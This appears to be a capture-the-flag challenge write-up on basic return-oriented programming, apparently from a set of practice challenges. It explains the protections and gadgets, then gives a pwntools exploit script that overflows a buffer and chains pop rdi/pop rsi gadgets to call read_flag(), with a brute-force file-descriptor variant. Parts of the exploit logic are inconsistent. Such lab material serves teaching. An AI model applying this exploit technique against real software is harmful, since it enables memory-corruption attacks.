# Challenge 09: Basic ROP

## Difficulty: Medium

## Vulnerability Type: Return-Oriented Programming (ROP)

## Description
Introduction to ROP chains. We need to call `read_flag()` with the correct arguments using ROP gadgets.

## Protections
- **NX**: Enabled (no shellcode)
- **PIE**: Disabled (gadgets at fixed addresses)
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### Target Function
```c
void read_flag(int fd, char *buf)
```

We need to:
1. Open flag.txt (or use stdin fd)
2. Call read_flag with proper arguments

### ROP Gadgets Available
The binary contains gadgets:
```asm
pop rdi; ret    # Set first argument (rdi)
pop rsi; ret    # Set second argument (rsi)
```

## Exploitation Strategy

### x64 Calling Convention
- First argument (fd): RDI
- Second argument (buf): RSI

### Simple Approach
Since `read_flag` expects a file descriptor, we can:
1. Call `open("flag.txt", O_RDONLY)` first
2. Then call `read_flag(fd, buf)`

But simpler: use stdin (fd=0) or abuse existing file descriptors.

### ROP Chain
```python
# Find gadgets
pop_rdi = # address of "pop rdi; ret"
pop_rsi = # address of "pop rsi; ret"
read_flag_addr = # address of read_flag()

# Find writable memory (BSS, data segment)
writable_addr = 0x404000  # Example BSS address

# Build ROP chain
rop_chain = p64(pop_rdi)
rop_chain += p64(fd_value)        # fd for flag.txt
rop_chain += p64(pop_rsi)
rop_chain += p64(writable_addr)   # buffer address
rop_chain += p64(read_flag_addr)  # call read_flag(fd, buf)
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9009)
else:
    p = process('./challenge')

# Get addresses
p.recvuntil(b'at: ')
read_flag = int(p.recvline().strip(), 16)

# Find gadgets using ROPgadget or ropper
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

log.info(f"read_flag: {hex(read_flag)}")
log.info(f"pop rdi: {hex(pop_rdi)}")
log.info(f"pop rsi: {hex(pop_rsi)}")

# Find writable memory (BSS)
writable = elf.bss() + 0x100

# Alternative: First call open() to get fd
# But simpler: We can open flag.txt manually or use a ROP to call open()

# For this challenge, let's assume flag.txt is fd 3 (common case)
# Or we build a full ROP chain to call open()

# Full ROP chain: open("flag.txt", O_RDONLY) -> read_flag(fd, buf)

# First, we need "flag.txt" string somewhere in memory
# Option 1: It might already be in binary
# Option 2: Write it using another ROP chain
# Option 3: Use read() to write it to BSS

# Simplified approach for CTF:
# Many CTFs pre-open flag.txt, or we can use:
offset = 72

payload = b'A' * offset

# Call open("flag.txt", 0)
flag_str = next(elf.search(b"flag.txt\x00")) if b"flag.txt" in elf.data else None

if flag_str is None:
    # Write flag.txt to BSS first
    # (This requires more complex ROP - read() syscall or multiple writes)
    log.error("flag.txt string not in binary, need to write it")
else:
    # Call open(flag_str, 0)
    payload += p64(ret)  # Stack alignment
    payload += p64(pop_rdi)
    payload += p64(flag_str)
    payload += p64(pop_rsi)
    payload += p64(0)  # O_RDONLY
    payload += p64(elf.plt['open'])  # open() from PLT

    # Result (fd) will be in RAX
    # Now call read_flag(RAX, writable)
    # But we can't easily move RAX to RDI without a gadget...

    # Alternative: Assume flag.txt is already open as fd 3
    payload += p64(pop_rdi)
    payload += p64(3)  # Assumed fd
    payload += p64(pop_rsi)
    payload += p64(writable)
    payload += p64(read_flag)

p.sendafter(b'input: ', payload)
p.interactive()
```

### Simpler Exploit (if open() is complex)
```python
# Just try different fd values (3, 4, 5)
for fd in range(3, 10):
    payload = b'A' * 72
    payload += p64(pop_rdi)
    payload += p64(fd)
    payload += p64(pop_rsi)
    payload += p64(writable)
    payload += p64(read_flag)
    # Try each fd
```

## Automated Detection
- **ROP Required**: NX enabled, no win() function with direct call
- **Gadgets Available**: Found via ROPgadget tool
- **Target Function**: Exists but needs arguments
- **Strategy**: Build ROP chain to set up arguments and call function

## Finding Gadgets
```bash
ROPgadget --binary challenge | grep "pop rdi"
ROPgadget --binary challenge | grep "pop rsi"
ropper --file challenge --search "pop rdi"
```

## Learning Objectives
- ROP chain construction
- x64 calling convention
- Gadget hunting
- Argument passing via ROP
- Stack pivoting basics

## Tools
- ROPgadget
- ropper
- pwntools ROP module
